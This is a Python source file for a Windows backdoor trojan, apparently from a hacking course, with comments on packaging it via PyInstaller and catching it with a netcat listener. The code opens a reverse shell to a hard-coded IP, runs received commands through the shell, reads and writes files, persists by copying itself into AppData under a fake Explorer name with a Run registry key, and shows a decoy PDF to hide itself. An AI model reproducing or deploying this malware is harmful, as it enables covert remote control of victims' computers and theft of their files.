#!/usr/bin/env python

# work on all os system
# --> gaining access: client side attack (VEIL, metasploit)

# netcat: listen for incoming connections on specfic port
# nc -vv -l -p 80, 8080

# packaging: pyinstaller [filename] --onefile --noconsole
# --noconsole gets errors with standard output/input

import socket
import subprocess
import json
import os
import base64
import sys
import shutil

class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()

        # AF_INET: TCP/IP, IPv4, AF_INET6: IPv6, AF_UNIX: local connection
        # SOCK_STREAM: TCP, SCOK_DGRAM: UDP, SOCK_RAW: RAW
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # tuple (IP, port)
        self.connection.connect((ip, port))

        # connection.send("\n[+] Connection established.\n")

    def execute_system_command(self, command):
        # command:string --> shell=True; list --> shell=False
        
        # python2
        # DEVNULL = open(os.devnull, 'wb')
        
        # deal with --noconsole for input/output
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directoy to " + path

    def read_file(self, path):
        # open as binary file
        with open(path, "rb") as file:
            # download (e.g. image): convert to base64
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        # define as byte --> work with python3
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    def become_persistent(self):
        # Windows: copy the file to appdata, \dir_path\\files
        evil_file_location = os.environ["appdata"] + "\\Windows Exlporer.exe"
        
        if not os.path.exists(evil_file_location):
            # shutil.copyfile(__file__, evil_file_location)
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def run(self):
        while True:
            # buffer size: max data size once a time
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    # exit properly without warming
                    sys.exit() 
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command).decode()
                self.reliable_send(command_result)
            except Exception:
                # to maintain connection
                command_result = "[-] Error during command execution."

# defualt path for pyinstaller, trojan's front file
file_name = sys._MEIPASS + "\sample.pdf"
subprocess.Popen(file_name, shell=True)

try:
    # in case not connected to listener
    my_backdoor = Backdoor("192.168.140.130", 80)
    my_backdoor.run()
except Exception:
    sys.exit()